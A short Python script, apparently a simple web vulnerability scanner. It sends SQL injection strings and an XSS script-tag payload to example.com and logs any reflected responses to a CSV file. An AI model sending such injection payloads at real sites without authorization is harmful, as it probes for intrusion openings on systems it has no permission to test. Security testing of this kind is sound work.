import requests
import csv

# Define the target website
target = "https://example.com"

# Define the payloads to test for vulnerabilities
payloads = [
    {"method": "GET", "param": "username", "value": "admin'--", "type": "SQL"},
    {"method": "POST", "param": "password", "value": " or '1'='1", "type": "SQL"},
    {"method": "PUT", "param": "email", "value": "<script>alert('XSS')</script>", "type": "XSS"}
]

# Create a CSV writer to log the results
with open("results.csv", "w", newline="") as csvfile:
    writer = csv.writer(csvfile)

    # Write the header row
    writer.writerow(["method", "param", "value", "type", "status"])

    # Iterate over the payloads
    for payload in payloads:
        # Send a request to the target website with the payload
        response = getattr(requests, payload["method"].lower())(
            target, params={payload["param"]: payload["value"]}
        )

        # If the response contains the payload
        if payload["value"] in response.text:
            # Print a message indicating that a potential vulnerability was found
            print("Potential vulnerability found:", payload["param"], "=", payload["value"])

            # Write the result to the CSV file
            writer.writerow(
                [payload["method"], payload["param"], payload["value"], payload["type"], response.status_code]
            )
